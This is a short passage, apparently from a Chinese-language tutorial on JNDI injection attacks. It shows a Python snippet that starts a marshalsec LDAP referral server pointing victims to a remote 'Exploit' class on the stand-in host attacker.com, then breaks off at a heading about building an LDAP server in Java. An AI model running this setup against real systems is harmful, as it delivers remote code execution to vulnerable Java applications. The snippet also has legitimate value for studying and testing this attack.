# 使用marshalsec启动LDAP服务器，返回远程类引用
cmd = 'java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker.com/#Exploit" 1389'
subprocess.Popen(cmd, shell=True)
print("LDAP server started on port 1389")


Java实现简易LDAP服务器（使用UnboundID LDAP SDK）：
